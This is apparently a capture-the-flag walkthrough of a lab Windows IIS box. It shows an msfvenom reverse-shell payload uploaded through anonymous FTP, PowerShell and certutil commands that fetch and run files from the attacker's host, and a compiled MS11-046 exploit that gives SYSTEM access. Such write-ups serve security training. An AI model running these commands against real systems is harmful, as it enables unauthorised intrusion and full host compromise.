Here’s what nmap teaches us :

- port 21 (FTP) - with anonyous login and 2 files / 1 directorie
- port 80 (HTTP) - IIS 7.5

First I go to the website :

![Website IIS](/assets/imgs/devel/website_IIS.PNG)

This is a default IIS7 installation. Looking at the image, I see that it's called "welcome.png", the same name as the one on the FTP, weird. Let's see what I can do with the FTP.

```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:liodeus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

To login I used the following credentials "anonymous:Anything" and I have the right to list files/directories, nice, can I write also ?

First I created a html test file :

```
echo "<h1>test</h1>" > test.html
```

Then over the ftp I used the command "put <file>" to upload my newly created file.

```
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
15 bytes sent in 0.00 secs (36.6211 kB/s)
```

 It seems to work ! Let's go see if I can view it.

![Website IIS](/assets/imgs/devel/test_html.PNG)

I can upload files as I want, nice ! So now let's upload a reverse shell !

## Exploit

------

For a reverse shell I used msfvenom and "aspx" extension because it's IIS.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f aspx > shell.aspx
```

Upload the reverse shell :

```
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2746 bytes sent in 0.00 secs (6.9280 MB/s)
```

Start the nc listener :

```
nc -lvp 1234
```

Then go see the page where the shell is upload :

```
curl http://10.10.10.5/shell.aspx
```

And I have a connection : 

```
nc -lvp 1234
listening on [any] 1234 ...
10.10.10.5: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49164

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

I'm not "nt authority\system" (root on windows), I have the same rights as the web server, let's escalate !

Let's do some Windows reconnaissance, for that I used something called "winPEAS" [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). So let's upload it to the box :

I'll show different methods to upload a file :

Start a HTTP server with python :

```
python -m SimpleHTTPServer
```

Then download the file using powershell :

```
powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.4:8000/winPEAS.bat")
```

Or with certutil.exe

```
certutil.exe -urlcache -split -f http://10.10.14.4:8000/winPEAS.bat
```

You can do it with smbserver from impacket :

```
sudo smbserver.py liodeus ./
[sudo] password for liodeus: 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed

```

Then copy the file that you need :

```
c:\Windows\Temp>copy \\10.10.14.4\liodeus\winPEAS.bat .
copy \\10.10.14.4\liodeus\winPEASany.exe .
        1 file(s) copied.
```

The file is upload, now run it :

```
winPEAS.bat
```

It will run and output a lot of informations. What i'm interresting in is this part :

This parts tells me :

- OS version : 6.1.7600 N/A Build 7600
- If patches are install - Hotfix(s): N/A
- And wich vulnerable Patch I should test

Searching for exploit with google I typed : "6.1.7600 N/A Build 7600 exploit" and the first link is this one [https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564).

It's working on Windows 7 and there is an explanation on how to compile it :

```
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the invoking shell/process
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
#   Exploit prerequisites:
#     - low privilege access to the target OS
#     - target OS not patched (KB2503665, or any other related
#       patch, if applicable, not installed - check "Related security
#       vulnerabilities/patches")
#   Exploit test notes:
#     - let the target OS boot properly (if applicable)
#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
```

So I download it :

```
wget https://www.exploit-db.com/raw/40564 -o exploit.c
```

Then compile it as the notes say :

```
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

And I get the file "exploit.exe", just need to upload it on the box, so as before, I choose one of the method that I show earlier :

```
python -m SimpleHTTPServer
```

```
certutil.exe -urlcache -split -f http://10.10.14.4:8000/exploit.exe
```

Then I run it :

```
c:\Windows\Temp>exploit.exe
exploit.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

And voila I'm nt authority\system !

During my research, I found this two github repository, which contains pre-compile exploit for windows :

- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

Now let's read the flags !
